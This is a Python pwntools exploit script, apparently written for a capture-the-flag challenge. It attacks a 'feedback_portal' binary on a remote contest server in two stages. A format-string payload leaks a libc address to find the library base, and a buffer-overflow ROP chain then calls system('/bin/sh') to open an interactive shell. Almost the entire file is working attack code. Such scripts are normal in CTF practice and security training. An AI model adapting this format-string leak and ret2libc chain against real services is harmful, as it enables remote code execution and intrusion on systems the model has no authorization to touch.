#!/usr/bin/env python3
from pwn import *
"""
The idea here is to perform a ret2libc attack developed in 2 steps,
 first we calculate the libc base addres throught the FORMAT STRING then i can "pick" 
 funtioin from libc and reuse it in order to spawn a shell

"""
context.binary = elf = ELF('./feedback_portal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)


HOST,PORT= "offsec.m0lecon.it", 13530
OFFSET_TO_RIP=136


p= remote(HOST,PORT)
#p = process(elf.path)
#============== 1 STAGE: LIBC_BASE  ==================#
#The idea is to leak an address of libc(specifically the  "_IO_2_1_stderr_"), 
# this is possible because the program is vulnerable to format strings

p.recvuntil(b'name:\n')
p.sendline(b'%11$p') # <-- possible libc address (it start with 0x7ffXX) this address is refferred to _IO_2_1_stderr_ since i saw in gdb and calculate the format strings (5 printf parameters, from 6 starts red from strack.) 
                    
leacked_line = p.recvline().strip()
leaked_libc = int(leacked_line.split(b',')[1].strip(), 16)
print(f"Leaked address: {hex(leaked_libc)}")


libc_base = leaked_libc - libc.sym["_IO_2_1_stderr_"]


print("LIBC_BASE",hex(libc_base))



libc.address=libc_base# <--Now that i set the libc base address, in order to calculate the right addresses when i retrieve the gadjects

#============== 2 STAGE: CALL system(bin/bash) ==================#
#Now i can retreive the gadget needed from the libc (nowi have the right addresses) and the binary itself,
#  in order to compose a valid rop cahin that spawn a shell

rop= ROP(libc)
POP_RDI   = rop.find_gadget(['pop rdi', 'ret'])[0]
RET       = rop.find_gadget(['ret'])[0]
BINSH = next(libc.search(b'/bin/sh\x00'))
system_addr = libc.symbols['system']

log.success(f"libc base = {hex(libc.address)}")
log.success(f"system    = {hex(system_addr)}")
log.success(f"/bin/sh   = {hex(BINSH)}")
p.recvuntil(b'feedback:\n')

stage2 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET),          # stack alignment
    p64(POP_RDI),
    p64(BINSH),
    p64(system_addr),

)
p.sendline(stage2)
p.interactive()


#0x7f3ee26eff75 <-- leak: __libc_start_call_main + 117
#0x29d90 <-- offset del simbolo __libc_start_call_main dentro libc 
#0x75 <-- 117 in decimale, offset interno alla funzione
#>>> print("".join(f"%{i}$lx." for i in range(10, 10)))


